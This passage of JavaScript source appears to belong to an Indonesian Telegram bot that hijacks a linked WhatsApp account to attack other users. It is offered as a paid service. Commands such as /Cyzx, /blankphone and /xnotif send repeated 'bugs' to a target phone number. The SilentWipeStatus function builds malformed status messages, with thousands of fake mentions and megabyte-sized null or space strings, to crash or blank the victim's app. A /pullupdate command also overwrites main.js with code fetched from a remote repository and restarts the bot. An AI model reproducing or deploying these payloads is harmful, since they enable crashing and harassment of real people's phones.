    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // Download foto ke buffer
    const response = await fetch(fileUrl);
    const buffer = Buffer.from(await response.arrayBuffer());

    // Upload ke PicWish API
    const form = new FormData();
    form.append("image_file", buffer, { filename: "image.jpg" });
    form.append("type", "clean"); // "clean" = umum, "face" = wajah
    form.append("scale_factor", "4"); // 4 = 4x lebih besar

    const upscaleRes = await fetch("https://api.picwish.com/v1/photo-enhancer", {
      method: "POST",
      body: form,
    });

    const result = await upscaleRes.json();
    if (!result.image_url) throw new Error();

    // Kirim hasil
    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id);
    await ctx.replyWithPhoto(result.image_url, {
      caption: "✅ *Foto berhasil ditingkatkan kualitasnya!*",
    });
  } catch (err) {
    console.error("HD Error:", err);
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      "❌ Gagal memproses foto. Coba foto lain atau coba lagi nanti."
    );
  }
});
// ================= DELAY ================= //
const delay = (ms) =>
  new Promise(resolve => setTimeout(resolve, ms));

// ================= LIST BOT ================= //
const botList = [];
const pendingPairing = new Set();

// ================= CONNECT ================= //
bot.command("connect", checkOwner, async (ctx) => {
  try {

    const q = ctx.message.text.split(" ")[1];

    // ================= INPUT CHECK ================= //
    if (!q) {
      return ctx.reply(
`
<blockquote><b>🪧 𝙴𝚇𝙰𝙼𝙿𝙻𝙴</b></blockquote>
<code>/connect 628xxx</code>
`,
{ parse_mode: "HTML" }
      );
    }

    let phoneNumber = q.replace(/[^0-9]/g, "");

    // ================= FORMAT NUMBER ================= //
    if (phoneNumber.startsWith("08")) {
      phoneNumber = "62" + phoneNumber.slice(1);
    }

    // ================= VALID NUMBER ================= //
    if (
      phoneNumber.length < 8 ||
      phoneNumber.length > 15
    ) {
      return ctx.reply(
`
<blockquote><b>❌ 𝙽𝚄𝙼𝙱𝙴𝚁 𝙸𝙽𝚅𝙰𝙻𝙸𝙳</b></blockquote>
⌬ Gunakan nomor dengan kode negara
⌬ Example : 628xxx
`,
{ parse_mode: "HTML" }
      );
    }

    // ================= PENDING CHECK ================= //
    if (pendingPairing.has(phoneNumber)) {
      return ctx.reply(
`
<blockquote><b>⚠️ 𝙿𝙰𝙸𝚁𝙸𝙽𝙶 𝙿𝙴𝙽𝙳𝙸𝙽𝙶</b></blockquote>
⌬ Target : ${phoneNumber}
⌬ Status : Waiting Process
`,
{ parse_mode: "HTML" }
      );
    }

    pendingPairing.add(phoneNumber);

    // ================= DELAY ================= //
    await delay(5000);

    try {
      await sock.sendPresenceUpdate("available");
    } catch {}

    await delay(3000);

    // ================= REQUEST CODE ================= //
    const code =
      await sock.requestPairingCode(phoneNumber);

    // ================= FAILED ================= //
    if (!code) {

      pendingPairing.delete(phoneNumber);

      return ctx.reply(
`
<blockquote><b>❌ 𝙵𝙰𝙸𝙻𝙴𝙳 𝚁𝙴𝚀𝚄𝙴𝚂𝚃</b></blockquote>
⌬ Target : ${phoneNumber}
⌬ Status : Failed Get Pairing
`,
{ parse_mode: "HTML" }
      );
    }

    const formattedCode =
      code.match(/.{1,4}/g)?.join("-") || code;

    // ================= SAVE BOT ================= //
    if (!botList.includes(phoneNumber)) {
      botList.push(phoneNumber);
    }

    // ================= SEND RESULT ================= //
    await ctx.replyWithPhoto(
      "https://files.catbox.moe/j0mmhf.jpg",
      {
        caption:
`
<blockquote><b>ℝ𝔼ℚ𝕌𝔼𝕊𝕋 ℙ𝔸𝕀ℝ𝕀ℕ𝔾 ℕ𝕌𝕄𝔹𝔼ℝ</b></blockquote>
⌬ Target Number : ${phoneNumber}
⌬ Pairing Code : ${formattedCode}
⌬ Status : Success Request

<blockquote>
☛ Silahkan masukkan kode pairing tersebut melalui notifikasi WhatsApp untuk menautkan perangkat kedalam bot.
</blockquote>
`,
        parse_mode: "HTML"
      }
    );

    // ================= AUTO CLEAR ================= //
    setTimeout(() => {
      pendingPairing.delete(phoneNumber);
    }, 60000);

  } catch (err) {

    console.log("Connect Error :", err);

    pendingPairing.clear();

    ctx.reply(
`
<blockquote><b>❌ 𝚂𝚈𝚂𝚃𝙴𝙼 𝙴𝚁𝚁𝙾𝚁</b></blockquote>
⌬ Status : Failed Execute
⌬ Type : Connect System
`,
{ parse_mode: "HTML" }
    );

  }
});

// ================= LIST BOT ================= //
bot.command("listbot", checkOwner, async (ctx) => {

  if (botList.length < 1) {
    return ctx.reply(
`
<blockquote><b>❌ 𝙻𝙸𝚂𝚃 𝙱𝙾𝚃 𝙴𝙼𝙿𝚃𝚈</b></blockquote>

⌬ Status : No Connected Bot
`,
{ parse_mode: "HTML" }
    );
  }

  let teks =
`
<blockquote><b>📦 𝙻𝙸𝚂𝚃 𝙲𝙾𝙽𝙽𝙴𝙲𝚃 𝙱𝙾𝚃</b></blockquote>

`;

  botList.forEach((num, i) => {
    teks += `⌬ ${i + 1}. ${num}\n`;
  });

  teks +=
`

<blockquote>⌬ Total Connected : ${botList.length}
</blockquote>
`;

  ctx.reply(teks, {
    parse_mode: "HTML"
  });

});

let isUpdating = false; 

bot.command("pullupdate", async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Akses hanya untuk pemilik");
  }

  // Anti spam update
  if (isUpdating) {
    return ctx.reply("⏳ Update sedang berjalan...");
  }

  isUpdating = true;

  const UPDATE_FILE = "main.js";
  const UPDATE_URL = "https://raw.githubusercontent.com/GyzkxT/AutoUpdateBaseAkaozik/refs/heads/main/main.js";
  const UPDATE_PATH = `./${UPDATE_FILE}`;

  await ctx.reply(
    `⏳ <b>Auto Update Script...</b>\n<blockquote>Mohon tunggu beberapa saat, bot sedang mengambil file terbaru.</blockquote>`,
    { parse_mode: "HTML" }
  );

  try {
    await new Promise((resolve, reject) => {
      const file = fs.createWriteStream(UPDATE_PATH);
      https.get(UPDATE_URL, (response) => {
        if (response.statusCode !== 200) {
          return reject(new Error(`HTTP ${response.statusCode}`));
        }
        response.pipe(file);
        file.on("finish", () => {
          file.close(resolve);
        });
      }).on("error", (err) => {
        fs.unlink(UPDATE_PATH, () => {});
        reject(err);
      });
    });

    await ctx.reply(
      `✅ <b>Update berhasil!</b>\n🧩 Ditemukan file <b>main.js</b>\n♻ Restarting bot...`,
      { parse_mode: "HTML" }
    );

    setTimeout(() => {
      process.exit(0);
    }, 2500);
  } catch (e) {
    console.error(e);
    await ctx.reply(
      `❌ <b>Gagal update.</b>\n<blockquote><code>${String(e.message || e)}</code></blockquote>`,
      { parse_mode: "HTML" }
    );
  } finally {
    isUpdating = false;
  }
});

// ================= KILL SESSION ================= //
bot.command("killsesi", checkOwner, async (ctx) => {
  try {
    if (sock) {
      try {
        await sock.logout();
      } catch {}
      sock = null;
    }

    const deleted = deleteSession();
    global.pairingMessage = null;

    if (deleted) {
      ctx.reply("🗑️ Session berhasil dihapus, Silahkan ketik /restart lalu setelah itu /connect kembali untuk menghubungkan Sender atau Bot");
    } else {
      ctx.reply("⚠️ Session tidak ditemukan");
    }

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal hapus session ketik /restart lalu setelah itu killsesi kembali");
  }
});
/// CASE BUG 1 \\\
bot.command(
  "Cyzx",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /Cyzx 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>Bug sent to target:</b> ${q}
<b>Eksekusi Bug By:</b> ${username}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Çêk ☇ ₮årgê₮",
                url: `https://wa.me/${q}`,
                style: "primary"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 150; i++) {
        console.log(
          chalk.yellow(`[ PROGRES ] MENGIRIM BUG TO ${q}`)
        );
        await SilentWipeStatus(sock, target);
        await sleep(5000);
      }
    })();

  }
);
/// CASE BUG 1 \\\
bot.command(
  "xinvisible",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /xinvisible 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>Bug sent to target:</b> ${q}
<b>Eksekusi Bug By:</b> ${username}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: "primary"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 1; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG TO ${q}`)
        );
        await VnXNewDenglayHardInpis(sock, target);
        await sleep(1500);
      }
    })();

  }
);
/// CASE BUG 1 \\\
bot.command(
  "ghostdelay",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /ghostdelay 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>Bug sent to target:</b> ${q}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: "danger"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 1; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG ${i + 1} TO ${q}`)
        );
        await VnXNewDenglayHardInpis(sock, target);
        await sleep(500);
      }
    })();

  }
);
/// CASE BUG 1 \\\
bot.command(
  "xglitch",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /xglitch 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>Bug sent to target:</b> ${q}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: "success"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 5; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG ${i + 1} TO ${q}`)
        );
        await VnXNewDenglayHardInpis(sock, target);
        await sleep(1000);
      }
    })();

  }
);
/// CASE BUG 1 \\\
bot.command(
  "zxcv",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /zxcv 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>ZXCV bug sent to target:</b> ${q}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: "danger"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 5; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG ${i + 1} TO ${q}`)
        );
        await VnXNewSpamNotifToDelayInvisV2(sock, target);
        await sleep(1000);
      }
    })();

  }
);
/// CASE BUG 1 \\\
bot.command(
  "xnovas",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /xnovas 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>XNOVAS bug sent to target:</b> ${q}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: "success"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 1; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG ${i + 1} TO ${q}`)
        );
        await BulldozerByDharzy(sock, target);
        await sleep(1500);
      }
    })();

  }
);
/// CASE BUG 1 \\\
bot.command(
  "iphns",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /iphns 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>IPHNS bug sent to target:</b> ${q}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: "danger"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 5; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG IOS TO ${q}`)
        );
        await InvisibleIOS(sock, target);
        await sleep(1500);
      }
    })();

  }
);
/// CASE BUG 1 \\\
bot.command(
  "blankphone",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /blankphone 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>Bug sent to</b> ${q}
<b>Type</b> Visible Bugs
<b>Effect</b> BLANK ANDROID`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 15; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG ${i + 1} TO ${q}`)
        );
        await VnXNewBlankPyment(sock, target);
        await sleep(1500);
      }
    })();

  }
);
/// CASE BUG 1 \\\
bot.command(
  "xnotif",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /xnotif 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>Bug sent to:</b> ${q}
<b>Type:</b> Visible Bugs
<b>Effect:</b> SPAM NOTIFIKASI`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 20; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG ${i + 1} TO ${q}`)
        );
        await VnXNewblankNotif(sock, target);
        await sleep(3000);
      }
    })();

  }
);
// ------------ (  FUNCTION BUGS ) -------------- \\

async function SilentWipeStatus(sock, target) {
  const GhostPayload = [
    {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1995 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              ],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593,
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
          },
        },
      },
    },
    {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/webp",
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "1173741824",
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            isAnimated: false,
            viewOnce: false,
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 1995 }, () => "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              ],
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9999,
              isForwarded: true,
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: { text: "", format: "DEFAULT" },
                      nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3,
                      },
                    },
                  },
                },
              },
            },
          },
        },
      },
    },
    {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
        mimetype: "image/jpeg",
        caption: " X ",
        fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
        fileLength: "149502",
        height: 1397,
        width: 1126,
        mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
        fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
        directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1777621571",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJCR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFL/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIhEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFCR/9oACAEBAAE/AP7FNnt/Pj//2Q==",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true
        },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          2560752640,
          2478045696,
          578944000,
          3047881856
        ],
        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
      }
    }
  ];

  const GhostPayload2 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "X", 
            format: "EXTENTION_1" 
          },
          nativeFlowResponseMessage: {
            name: "address_message", 
            paramsJson: `{\"display_text\":\"${" ".repeat(1000000)}\",\"id\":\".zer0x\",\"description\":\"Xwrcvzz.\"}`, 
            version: 3
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`), 
            statusAttributionType: "SHARED_FROM_MENTION",
          }, 
        }
      }
    }
  };

  for (const a of GhostPayload) {
    await sock.relayMessage("status@broadcast", a, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: [],
                },
              ],
            },
          ],
        },
      ],
    });
  }

  await sock.relayMessage("status@broadcast", GhostPayload2, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: [],
              },
            ],
          },
        ],
      },
    ],
  });
  console.log("succes send bug");
}

// ━━━〔 SISTEM MEMJALANKAN - BOT  〕━━━ //

(async () => {
  try {
    console.clear();

    const startTime = Date.now();

    const color = (c, t) => `\x1b[${c}m${t}\x1b[0m`;
    const cyan = (t) => color(36, t);
    const green = (t) => color(32, t);
    const red = (t) => color(31, t);
    const yellow = (t) => color(33, t);
    const dim = (t) => color(2, t);

    const line = "════════════════════════════════════";

    const printBox = (title) => {
      console.log(`
╔${line}╗
║   ${title.padEnd(30, " ")}   ║
╚${line}╝
`);
    };

    const logStep = (msg) => console.log(cyan(`➤ ${msg}`));
    const logOk = (label, msg) =>
      console.log(green(`✔ ${label.padEnd(12)} : ${msg}`));

    printBox("⚡ ÄKÄÖZÌK ÌñVÌÇ₮Ú§  SCRIPT");

    console.log(dim("System initializing...\n"));

    currentMode = getMode();
    logOk("Mode", currentMode);

    logStep("Connecting WhatsApp...");
    await startSesi();
    logOk("WhatsApp", "Connected");

    logStep("Starting Telegram bot...");
    await bot.launch();
    logOk("Telegram", "Active");

    process.once("SIGINT", () => {
      console.log(red("\n🛑 SIGINT → Shutdown initiated"));
      bot.stop("SIGINT");
    });

    process.once("SIGTERM", () => {
      console.log(red("\n🛑 SIGTERM → Shutdown initiated"));
      bot.stop("SIGTERM");
    });

    const uptime = ((Date.now() - startTime) / 1000).toFixed(2);

    console.log(`
╔${line}╗
║        🟢 SYSTEM ONLINE          ║
╠${line}╣
║ ⏱️ Uptime   : ${uptime}s
║ 🔐 Status   : SECURE
║ ⚙️ Engine   : RUNNING
╚${line}╝
`);

  } catch (err) {
    console.clear();

    const red = (t) => `\x1b[31m${t}\x1b[0m`;
    const yellow = (t) => `\x1b[33m${t}\x1b[0m`;

    console.log(`
╔════════════════════════════════════╗
║          ❌ SYSTEM ERROR          ║
╚════════════════════════════════════╝
`);

    console.log(red("⚠️ Unexpected failure:\n"));
    console.error(err);

    setTimeout(() => {
      console.log(yellow("\n🔄 Restarting system..."));
      process.exit(1);
    }, 3000);
  }
})();
